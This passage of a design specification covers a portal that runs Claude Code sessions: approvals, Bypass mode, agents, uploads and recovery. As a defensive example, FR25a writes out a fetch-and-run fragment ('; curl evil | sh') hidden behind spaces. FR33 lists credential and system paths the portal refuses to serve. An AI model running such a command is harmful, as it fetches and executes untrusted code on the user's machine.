| FR9  | The composer stays live while the session runs. Offline, one pending message is held in memory only, shown as "Sends when back online · Cancel", lost on reload and never stored; approvals are disabled. Each session's draft survives rotation, resizing and navigation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| FR10 | Send while working **steers**: Claude reads it at its next model request, usually right after the running tool, or as the next turn if this one ends first ✅ (S3); once read, it moves to where Claude read it, labelled "Steered mid-task". "Send when Claude finishes" (a queued message's ⋯; Alt+Enter) makes it its own turn ✅. "Send now" isn't offered: it waited for the running tool anyway ✅ (S3, flags off).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| FR11 | Three message states: "Queued · Claude reads this after the current step", with ✕, which withdraws it ✅ (X5) and returns the text to the box; "Read", a brief tick; "Not sent · Retry · Edit" (failed, refused or discarded). "Sending" shows only after 300 ms.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| FR12 | **Stop** ends the turn: queued messages are cancelled with their text back in the box, running tools are killed, the session stays usable (plain interrupt ✅, S4), and background agents keep running. **Stop all** also stops every agent and background task. ⋯ → "Stop turn, keep queued" says "Queued messages run next". Stop while a request waits denies it and stops the turn. **End session** ends the process ✅ (S8). Stop never sends a signal.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| FR13 | "/" lists only allowed commands, the same for UI and MCP text (T-597 S1b: `controller.send()` writes a text bare, not in the portal frame, so Claude Code runs it, only when ALL hold: the actor is a session or a Portal MCP token (a ticket, CI or portal actor stays framed); one line, no line break of any kind; no leading space and the first word exactly `/compact`, `/context` or `/reload-plugins` (case-sensitive); only `/compact` takes an argument, after one space, of at most 500 characters; no attachment. Else it is framed. The stored event keeps its actor; `chat/slash.ts` holds the one set and the rule): `/compact`, `/context`, `/reload-plugins`, and skills from `system/init` minus a block list (`update-config`, `fewer-permission-prompts`, `loop`, `schedule`, and names Settings adds). `/model` and `/effort` open the pickers; over MCP they're refused, since `session_configure` does that. Anything else answers "Use the terminal for /<cmd>"; until Q6, `/clear` offers "New session in this folder". |
| FR14 | UI messages carry `origin: {kind: "human"}`; Portal MCP text doesn't. A message the portal sends for someone else carries an actor (`ticket:<id>`, `session:<id>`, `portal-mcp:<token id>`, or `portal:<what>` for the portal acting after a person's click, such as the handoff request when a chat moves to another Claude): it is recorded on the input row, stored with its actor on the transcript event, shown as "From ticket T-12", "From session “Coordinator”" or "From an MCP client" in a card of its own, never as something the person typed, and framed for Claude ("Portal message from … The user did not type this"). A session sending to another leaves "Sent to “title”" in its own transcript. `SendMessage` and `ListAgents` are off unless Settings allows them.                                                                                                                                                                                                                                                         |

### Controls: model, effort, ultracode, permission mode

| ID   | Requirement                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FR15 | Models come from the session's model list ✅, narrowed to Settings' allowed models and the endpoint's names (Account Pool FR1), and are validated first, since unknown IDs pass verbatim ✅ (S5). Rows show a friendly name and a hint; unknown IDs show as is, marked "custom host". A switch applies from the next request ✅ and warns: "Next reply re-reads 82k tokens · about $0.40 once". After an Account Pool move, a model the new endpoint lacks resets to the default with a system row, and the next turn reads "Account changed · context re-read uncached"; rejected earlier thinking offers "Continue in a new session" (Account Pool Q20).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| FR16 | Effort offers the model's supported levels ✅ plus "Default (medium)"; unsupported levels are disabled, with one reason line. Ultracode is a switch below it (on ✅, off 🔬), disabled with the reason when unavailable ✅, blocked by policy, on in another session of the workspace, or with under half the session budget left. It multiplies tokens and skips the subagent cap, so it shows what's left.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| FR46 | Typing "ultracode" shows "Ultracode for this task ×" above the text box; the keyword applies to that task only, and only with a human origin 🔬 (Q7).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| FR17 | (As built 2026-10-13: Plan, Manual, Edit, Auto; Auto's rules in §21, FR17a.) Modes (Manual, Accept edits, Plan, Auto, Don't ask) switch live within Settings' "Modes offered in chat" (✅ Accept edits, Plan, Don't ask; 🔬 Manual, Auto, leaving Bypass), described as in §12.4; blocked ones say "Blocked by policy Standard".                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| FR18 | Chips show applied values ✅, never requested ones, because clamps are silent: "Opus · Medium"; a gold dot when clamped, with the reason in the sheet ("High · runs at medium, policy cap"); "Ultracode" in gold when on. Each change adds a system row. A policy change applies at once: a newly blocked mode switches to the start mode (Settings FR9).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| FR19 | Context use ✅ is a small ring by Send at every width (2026-10-13): the arc and the number inside carry the percentage in its tint (accent, gold from 80 %, red from 95 %), with no bar and no label; the token counts ("42 % · 84,000 of 200,000 tokens") show on tap, hover or keyboard focus. The figure is `session.context`, from Claude Code's own usage report after the last turn; until one arrives, or when it names no window size, the ring is a neutral empty ring and the tip says what is known (never an invented percentage). The ring has one fixed size in every state, so the composer's row never changes shape. Not built: it opening categories and Compact.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| FR20 | **Bypass permissions**, the one full description. It needs all of: (1) policy allows it; (2) the session is bypass-capable: the person ticked "Allow Bypass later in this session" before the first Send, or chose "Restart to allow Bypass" (a resume at the next turn boundary). Only these pass `--allow-dangerously-skip-permissions`, without which the switch fails with `bypass_not_launched` ✅; MCP-started sessions and persona tests never get it. (3) a confirmation with Cancel focused and Confirm enabled only after ticking "Claude will run every tool without asking in api-dev, which has internet access and delivered credentials". (4) Re-auth (Web app §12.5). That's at least three deliberate taps plus re-auth. While on, the header is danger-tinted and rows say "Bypass"; leaving is one tap 🔬. Wakes and resumes never restore it ("Bypass turned off after sleep"), except the wake of a lead whose sleep kept it and that is still a lead at the wake (authority: the owner's own text on ticket T-417, 2026-10-15, that a lead keeps Bypass across sleep "as across a restart"; the checks are in FR39). A lead here is a kept lead (FR39) or, since T-1646 (a vanishing) and T-1692 (a sleep), any top-level crew lead: one marked a lead at its start (`lead`) or with workers. So marking a session a lead is not only stricter (the lead rules): it also lets its Bypass come back after a sleep, a vanishing, or a Move made while it slept, every time through the same gates (the policy, the capability, the person's own entry with the acknowledgement and a fresh server code, the grant); a worker is never a lead for this. A deliberate restart (a move, a Restart) keeps it while the policy allows it (§21, FR20a). **As built (2026-10-12), verified on Claude Code 2.1.296:** the policy is the shared setting `sessions.allowBypass` (off; turning it on asks for a confirmation and is audited; on the Settings page under Sessions); the opt-in exists only on the app's own create route (`allowBypass`, refused with `BYPASS_BLOCKED` while the policy is off) and is never inherited by a move, a ticket, Portal MCP or a session another one starts; the flag is passed only to capable sessions while the policy allows it; entering is `POST …/bypass {acknowledged}` after the policy, the capability, the tick and a re-check of the server code (the one credential the portal has, `POST /api/chat/reauth`, valid 10 minutes per sign-in, rate limited) and sends the one `set_permission_mode` request, whose answer is the only thing that makes a `bypassPermissions` report acceptable to the integrity checks; leaving is one tap (`set_permission_mode default`, observed to work); deny rules still hold while it is on (observed); without the flag the request fails with `bypass_not_launched` (observed); Bypass ends with its process (sleep, an exit, a restart: "Bypass turned off after sleep") and with a policy change, each audited (`GET /api/chat/audit`, entering is High). Phones: Mode chip, Bypass, tick, Turn on, then the code (four taps and the code). |

### Approvals and questions

| ID    | Requirement                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FR21  | Every request reaches the portal: sessions always launch with the stdio prompt host, without which Claude Code silently denies prompts and drops AskUserQuestion and the plan tools ✅ (S5b).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| FR22  | A permission request ✅ becomes a card in the dock (§12.3): tool, plain question ("Run this command?"), preview (the whole text asked about, FR25a; `browser_navigate` shows the address, "Open github.com/login?"), reason, the asking subagent, Deny and Allow. While it's docked the composer answers it: the placeholder reads "Or tell Claude what to do instead", and Send becomes "Deny & send" (deny, with the text as the note). ⋯ adds "Always allow in this session", hidden under Settings' managed-rules lock. Answers follow §10.3. Answered cards collapse to "Allowed once · npm test", "Allowed from Alfian's laptop · 14:02" or "No longer needed · the task was stopped".                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| FR23  | Allow is never focused, Enter never approves, nothing approves on swipe, offline disables the buttons, and the first answer per request wins. A card that appears or is stepped to ignores input for 500 ms while it fades in; after an answer, the outcome shows for about 600 ms before the next card; Allow never lands where Send or ✕ was.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| FR24  | AskUserQuestion becomes a question card (2–4 options, single or multiple) whose own answer is the composer ("Type your own answer"; Send reads "Answer"); ExitPlanMode a plan card ("Approve, accept edits", "Approve, ask before edits", "Keep planning"); a Workflow call a card with a token caution 🔬. Simple MCP elicitation forms become question cards; others are declined 🔬.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| FR25  | Requests never expire in the portal 🔬 (Q2), handoffs aside (FR45). A waiting one sets Needs input and feeds the Web app's attention service, as failed turns do: list order, nav and app badges, the tab title ("(2) Sessions · <name>"), push (Web app §11: Needs input; Failed for a failed turn), and inside a session the back button's count ("‹ 2"). A session gets no toast for its own requests while on screen. `?request=<id>` opens the dock on that request, never focusing Allow. Portal MCP answers only with its session-control switch on; allows need admin scope and a confirmation (its §13.3).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| FR25a | **What is approved is shown whole, and nothing is allowed that was not.** The portal keeps up to 8,000 characters of what a tool request asks to run (`chat_requests.full`, and `full_cut` when it was cut; migration 190), beside the 200-character summary in `detail`, which stays the card's one-line title and the transcript row. For Bash it is the command exactly as it will run, not folded, so `; curl evil \| sh` behind a run of 150 spaces is still there; for the file tools the path (not the contents: the Diff panel shows what changed); for the others the URL, query, pattern or description, and the plan of ExitPlanMode; for any other tool, an MCP tool say, or a known one whose field is not in its input (Claude Code renamed it), its whole input as JSON, so that whatever it is asked to run is in front of the person. It is redacted whole before it is cut, so a cut never splits a credential, and control, bidirectional and invisible characters are shown as `⟦U+202E⟧`. The card (FR22) and the [glance widget](glance-widgets.md) §10.6 show it in a monospace block that wraps and scrolls. Allow and Allow for session are offered only when the text is there and whole, and pressable only once the block has been read to its end when it does not fit; a request cut at the cap, or with no text (one asked before the column existed), can be denied and nothing else, with one line saying why ("Too long to show in full.", "Nothing to show for this request."). `controller.respond` refuses an Allow for such a request whoever sends it (409 `CONFLICT`: the card, the widget, Portal MCP, a tab that is out of date). Bypass, its confirmation and its re-check are untouched, and an approval rule must match this full input, never the summary. ✅ Built; checked with a real Claude Code 2.1.296 against a scripted stand-in: a six-line command with the 150-space run showed whole in the card and the widget, Deny and Allow from the widget reached Claude Code (`denied`, then `allowed_once` and the command ran). 🔬 The cap (8,000) and a plan longer than it (Q9 of [Glance widgets](glance-widgets.md)). |
| FR25b | **A request no process can answer is cleared, never left waiting (T-284, 2026-10-14).** Each request records the process that raised it (`chat_requests.proc`: Claude Code session id, segment and start, ids only; migration 830). A request of a process that is no longer the live one (a move, a restart, a crash, a resume) is resolved `stale` (the transcript reads "Cleared"): at a new process's launch (it has asked nothing yet), and on every liveness round (a minute); a row from before migration 830 counts as stale only when the live process started at least 60 s after the portal read it (a margin for a host clock ahead of the portal's). The chat leaves `waiting`; one `session.request_stale` audit row names the ids and why (`launch`, `sweep`, `restart`, `clear`, `gone`), never the request's text. **Restart** drops stale requests and refuses (409) only for a request of the live process; before refusing it asks the host, and a process the host says is gone is marked gone (its requests `stale`) and the restart goes on. `POST CHAT_API.clearRequest(id, requestId)` and the Portal MCP tool `session_request_clear` clear one explicitly (with every other stale request of the chat): `operate` on the session (an agent: a chat of its own workspace), a denial is the same 404, a request of the live process is refused (409: it is answered). A late `control_response` for a stale request is ignored and logged (INTEGRITY_CASES `control-stale`; pre-emptive: never seen in a real stream, kept so a stale id never reads as unknown); a host that cannot be reached keeps the request and the Restart is refused (fail closed); the audit holds each request id cut to 80 characters; every other integrity case is unchanged. Observed: the Konfersi chat 93b468c8 (2026-10-14 04:02 to 05:00 UTC) listed a dead process's approval for an hour; `session_respond` answered 503 and Restart 409.                                                                                                                                                                                                                       |
| FR45  | **Handoffs.** A Browser & desktop `browser_handoff` call (a long-running MCP call, not a permission request) becomes a `handoff` request and a dock card laid out like FR22 ([Browser & desktop](browser-desktop-pool.md) §15.4): "Browser", the checked origin's question, the agent's quote as untrusted text, Decline, and Take control, which opens the live view already in control. It sets Needs input and keeps the session awake; it clears when the call returns, Stop cancels it, and after 10 minutes of waiting (paused while someone has control) it expires: "The agent stopped waiting at 14:12", with Take control anyway and Open chat.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |

### Multi-agent monitoring

| ID   | Requirement                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| FR26 | Agents come from the `task_*` events ✅, with `background_tasks_changed` as the live set ✅ (S9; T-3017: the main thread's set is whole, so a background task that left it, an empty set included, reads ended; a chat with no live process counts no running agents): status, type, description, last tool, tokens and elapsed, nested by parent. Workflows group their agents, with phases where the stream reports them 🔬 (Q7); shell tasks get a section; finished rows fold ("… 4 done"); a subagent waiting on a request shows the gold Needs input dot and jumps to the dock.                                                               |
| FR27 | While anything runs, the **activity strip** above the composer reads "● Working · npm test · 1:12 · 3 agents ▴ · Stop", or "Working · browser · github.com · Watch" while the agent uses its browser. It expands in place, up to 40% of the visible viewport: "3 running · 1 done · 1 failed · Stop all", then one row per agent. "All agents ›" opens the full view; a row opens that agent's messages (`parent_tool_use_id` ✅), with its own Stop in that view's header 🔬. |
| FR28 | The session list is the cross-workspace monitor: each row shows the live summary, agent count and the waiting request. Terminal sessions stay in Monitoring's Agents tab, linked as "2 more in terminals".                                                                                                                                                                                                                                                                     |
| FR29 | Self-started turns count toward budgets and attention. Claude Code's own schedules are always off (T-1863): every start carries `--disallowedTools` with `CronCreate`, `CronDelete`, `CronList`, `ScheduleWakeup` and `RemoteTrigger` (`/loop` has nothing to schedule with), because a prompt Claude Code queues by itself is one the portal never sent and ends the session for integrity. Schedules go through Triggers and keep-going.                                                                                                                                                                                                                                                                                         |

### Attachments and downloads

| ID   | Requirement                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ---- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FR30 | **Attach anything in the composer.** **+** opens the OS picker (photos, camera and files, several at once); desktops also paste, or drop files anywhere on the page. Each file is uploaded on its own as soon as it is picked (`POST …/uploads`: the raw bytes, never JSON, streamed into the blob store, hashed and sniffed), so its tile shows progress, × cancels it and Send waits for it. Up to 20 files and 100 MB per message, 25 MB each, pictures 20 MB together; the limit that stops a file is said at once. The browser first scales a photo to 2,000 px on the long edge (the CLI caps there too ✅, S6; a PNG stays a PNG while it fits 4.5 MB, else a JPEG; a small picture or a GIF goes as it is; the rotation a phone keeps in metadata is applied); one it can't decode goes as is when it is PNG, JPEG, GIF or WebP under 5 MB, else "Can't read this photo format." Each attachment is a tile (thumbnail or type icon, name, size, ×); audio, video and files Claude can't open carry an ⓘ that says what Claude will and won't do with them. Android's share target (`/admin/sessions/share`) is not built.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| FR31 | **What Claude gets.** The portal keeps every upload in its blob store, per chat (`chat_files`, kind `upload`), and writes a copy into the workspace, `~/.claudepilot/uploads/<session id>/<name>-<8 hex>.<ext>` (cp-session `put`: base64 on stdin, a plain ASCII name, 0600, never through a link; nothing is ever written into a project folder), because Claude Code can only open what is there. The message it reads is the person's words, then a note: a picture it can take (PNG, JPEG, GIF, WebP, at most 5 MB and 8,000 px) goes in as an image block **ahead of the words**; text, code, CSV and PDF are `@path` mentions, which Claude Code expands when it runs the message (text and CSV arrive as a Read ✅, a PDF as "PDF file read: <path>" against the stand-in API ✅, 🔬 against the real one); audio, video, archives and other binaries are named with their type and size and what Claude can't do ("you can't hear it"), so it runs tools on them instead of guessing. Observed with 2.1.296: it follows `@` mentions only in a message's last block, and not in a message queued behind a running turn (the mention then stays text for Claude to follow). A model `Read` of a staged file asks permission (the folder is outside the session's), so the portal answers it, for exactly the files it staged for this chat. The transcript shows the words and the attachments, never the paths. A transfer that comes up short is tried once more; the second failure says how many bytes arrived ("… 750000 of 2097157 bytes arrived", from the host's `#short` line, 2026-10-13). **Found 2026-10-13:** every upload on a cluster workspace failed with exit 4 because `put` began with `exec 2>/dev/null`: a Kubernetes exec (containerd) closes stdin as soon as the last holder of an output pipe is gone, so `head` saw EOF before a byte arrived; `put` now keeps stderr's pipe open on fd 3 (`exec 3>&2 2>/dev/null`); verified through the portal's own path (KubernetesRuntime, hostInstaller, stageFile) into the kohi-event pod with a 6 MB file, and a test holds the pipe rule. |
| FR32 | **Artifacts: what the agent produces shows up in the chat.** A file the agent writes becomes a card where it happened (a picture as a thumbnail, anything else a row with its icon, name and size), each with a **Download**, and a tap opens its preview. What counts: a file created with Write (any type; at most four source files a turn), a document, picture, audio, video, table, web page or archive it wrote or edited, one a command made (found by a sweep when the turn ends, the newest 12), a tool's pictures and screenshots, and a file it hands over on purpose with the Portal MCP tool `artifact_publish` (scope `agent`, 25 MB). Source edits are not cards: they are the Changes view (FR34). The copy is taken when the file is produced, into the blob store (`chat_files`, kind `download`), so it survives the workspace stopping; a text copy has its secrets hidden (the workspace's secret values first, then credential shapes). The newest write of a path is the one shown; several files fold into one row; **Download all** zips the turn's files (200 entries, 100 MB, names made safe and unique, nothing read from the workspace). **Previews**, in a sheet (a dialog from 640 px): pictures in the viewer (pinch or double-tap zoom, swipe or arrows between a turn's pictures), text, code and JSON up to 1 MB with secrets hidden in the read-only code viewer (CodeMirror 6, loaded on first open: line numbers, the language's colours, soft wrap on by default with a toggle, disguising characters marked; T-148), CSV as a table, Markdown rendered, PDF in the browser's viewer (a phone opens it in a tab), audio and video in a player (Range), HTML only in an `<iframe sandbox>` with no scripts, forms or origin; SVG only downloads. The **Files** panel stays the workspace's folder browser and Changes; it is not how a person receives artifacts.                                                                                                                                                                                                              |
| FR33 | Path policy, checked on the opened file: real paths under `/home/node` only; never anything in the foundation's secret-path registry (the browser profile, `~/.claudepilot/browser/profile/**`, included), `~/.claude/**`, `~/.claudepilot/**` except the session's own uploads, `/etc/claudepilot/**`, `/etc/claude-code/**` or `/proc/**`. `~/Downloads`, Playwright's output included, is attacker-controlled: files there download as attachments with `nosniff` and `Content-Security-Policy: sandbox`, and images preview only re-encoded ([Browser & desktop](browser-desktop-pool.md) §13 Files). Every copy-out (artifacts, `artifact_publish`) and every Files download goes through it, and a text copy is scrubbed before it is stored. Observed: `/etc/passwd`, `~/.claude/**`, `~/.claudepilot/**` and a link out of the folder are refused, with no card.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| FR34 | "+42 −18" opens the **Diff**, in the cwd the latest `system/init` reports: against the merge base with the default branch when HEAD has its own commits, else the working tree against HEAD (5 s, 50 files, 1 MB each).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| FR47 | Pictures render inline in boxes sized in advance (an upload and an artifact carry their size): thumbnails in user bubbles, 240 px at most for tool images and produced pictures, each produced picture with a Download on it. A tap opens a full-screen viewer (pinch or double-tap zoom, swipe or arrows through the set, Download); on a phone that can share files over HTTPS, Download opens the share sheet ("Save Image"), otherwise the browser downloads the file. 🔬 the share sheet needs a real phone.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |

**Attachments and downloads: status (2026-10-12, A2b).** Checked in a Docker workspace with real Claude Code 2.1.296 answering through a scripted stand-in API, in Chromium at 390 and 1280 px, and in a production build.

Seven files of seven kinds attached at once, a 1.8 MB 3,000 px PNG scaled, throttled upload with a ring and a working ×, a 26 MB file refused at once. The share sheet and the camera need a real phone (🔬). |

A PDF is only a note against the stand-in (🔬 the real API).                                                                  |

Not built: Produced/Attached lists in the Files panel (by design: artifacts live in the chat).                                                            |

### Durability and recovery

| ID   | Requirement                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FR35 | Closed tabs and network drops never touch a session; tabs replay from their sequence number. Losing a reader loses nothing: replay from the stored offset is gapless and duplicate-free ✅ (S8, one reader killed at one offset). After a portal restart (untested), the portal lists sessions, checks liveness (§10.1) and reattaches from stored offsets; pending requests reappear 🔬 (Q2).                                                                                                                                                                                         |
| FR36 | Container, pod and daemon restarts, "Update Claude Code" and "Enable pools" leave no `exit.json`: the session is **Interrupted**, and a half-written last line is dropped. Resume, or the next message, relaunches it with `--resume` and fresh flags; history and cost return ✅ (S7c), background agents don't. An OOM kill (signal 9 in `exit.json`, or the runtime's OOM event) reads "Ended · out of memory", with Resume. Portal actions that end sessions warn first ("3 live sessions will end") and end them cleanly.                                                         |
| FR37 | One writer per session, enforced by `run.lock`, because two writers fork the history ✅ (S7d). A terminal `claude --resume` of a portal session shows as two processes for one ID ("Also open in a terminal"). A dropped send delivers a whole line or nothing, and a retry first looks for the line's UUID in the stream: the CLI echoes UUIDs ✅, but deduplication is the controller's job.                                                                                                                                                                                         |
| FR38 | A session **sleeps** (its process ends; it reads Idle) after Settings' idle time (30 minutes) with no running turn, pending request, queued input, background task or scheduled task, so Needs input and background work never sleep. Sleep happens under the send lock, so messages sent meanwhile go after the wake, which restores model, effort, ultracode and mode, never Bypass. Past 64 MB of output (images echo in base64 ✅) the segment rotates at the next idle point; until then the ingested prefix is freed in place (`fallocate --punch-hole`), so offsets don't move. |
